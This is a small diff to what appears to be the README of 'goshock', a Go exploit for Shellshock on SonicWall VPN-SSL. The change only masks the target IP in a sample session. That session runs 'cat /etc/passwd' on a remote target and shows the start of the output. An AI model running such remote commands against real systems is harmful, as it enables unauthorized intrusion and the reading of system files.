@@ -9,7 +9,7 @@ SonicWall VPN-SSL Exploit* using Golang ( * and other targets vulnerable to shel
 ```
 ▶ goshock
 
-TARGET> 200.x.x.x
+TARGET> x.x.x.x
 Linux Shell Command> cat /etc/passwd
 
 root:x:0:0:root:/root:/usr/sbin/cli
